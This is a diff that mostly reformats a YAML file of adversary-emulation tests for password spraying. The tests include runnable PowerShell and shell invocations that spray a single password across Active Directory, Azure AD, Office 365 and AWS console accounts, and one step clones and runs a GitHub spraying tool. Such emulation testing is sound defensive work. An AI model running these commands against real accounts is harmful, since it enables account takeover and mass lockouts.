@@ -18,7 +18,7 @@ atomic_tests:
   input_arguments:
     password:
       description: The password to try for each user in users.txt
-      type: String
+      type: string
       default: Spring2020
   dependencies:
   - description: |
@@ -39,11 +39,11 @@ atomic_tests:
 
     https://github.com/dafthack/DomainPasswordSpray
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     domain:
       description: Domain to brute force against
-      type: String
+      type: string
       default: $Env:USERDOMAIN
   executor:
     name: powershell
@@ -62,15 +62,15 @@ atomic_tests:
   input_arguments:
     password:
       description: single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)
-      type: String
+      type: string
       default: P@ssw0rd!
     domain:
       description: Domain FQDN
-      type: String
+      type: string
       default: $env:UserDnsDomain
     auth:
       description: authentication method to choose between "NTLM" and "Kerberos"
-      type: String
+      type: string
       default: NTLM
   executor:
     name: powershell
@@ -102,7 +102,7 @@ atomic_tests:
         }
       }
       Write-Host "End of password spraying"
-- name: Password spray all Azure AD users with a single password 
+- name: Password spray all Azure AD users with a single password
   auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
   description: |
     Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
@@ -112,15 +112,15 @@ atomic_tests:
   input_arguments:
     password:
       description: Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)
-      type: String
+      type: string
       default: P@ssw0rd!
     valid_username:
       description: Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>
-      type: String
+      type: string
       default: bruce.wayne@contoso.com
     valid_password:
       description: Valid password to authenticate as valid_username in the <valid_ms_account>
-      type: String
+      type: string
       default: iamthebatman
   dependency_executor_name: powershell
   dependencies:
@@ -176,15 +176,15 @@ atomic_tests:
     This atomic test will attempt a single password against all users in a password list at $env:Temp\usersdpsLight.txt. You can create this file manually
     or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     user_limit:
       description: The max number of users to put in the list when running the prereq_command
-      type: Integer
+      type: integer
       default: 200
     password:
       description: The password to try for each user in users.txt
-      type: String
+      type: string
       default: Spring2020
   dependencies:
   - description: |
@@ -233,11 +233,11 @@ atomic_tests:
   input_arguments:
     password:
       description: Single password to try against the list of user accounts
-      type: String
+      type: string
       default: P@ssword1
     user_list:
       description: File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)
-      type: String
+      type: string
       default: $env:temp\T1110.003UserList.txt
   dependency_executor_name: powershell
   dependencies:
@@ -255,18 +255,18 @@ atomic_tests:
       Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
 - name: Password Spray using Kerbrute Tool
   auto_generated_guid: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
-  description: |  
+  description: |
     Test a single password against a list of users
   supported_platforms:
   - windows
   input_arguments:
     domaincontroller:
       description: Domain controller where test will be run
-      type: String
+      type: string
       default: $ENV:userdnsdomain
     domain:
       description: Domain where you will be testing
-      type: String
+      type: string
       default: $ENV:userdomain
   dependency_executor_name: powershell
   dependencies:
@@ -297,22 +297,22 @@ atomic_tests:
   input_arguments:
     aws_account_id:
       description: ID of the AWS account
-      type: String
+      type: string
       default: "XXXXXXXX"
   dependencies:
-    - description: |
-        Check if go is installed
-      prereq_command: |
-        go version
-      get_prereq_command: |
-        echo Install GO
+  - description: |
+      Check if go is installed
+    prereq_command: |
+      go version
+    get_prereq_command: |
+      echo Install GO
   executor:
     command: |
-       cd /tmp
-       git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
-       cd /tmp/GoAWSConsoleSpray
-       go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
+      cd /tmp
+      git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
+      cd /tmp/GoAWSConsoleSpray
+      go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
     cleanup_command: |
-       rm -rf /tmp/GoAWSConsoleSpray
+      rm -rf /tmp/GoAWSConsoleSpray
     name: sh
     elevation_required: false
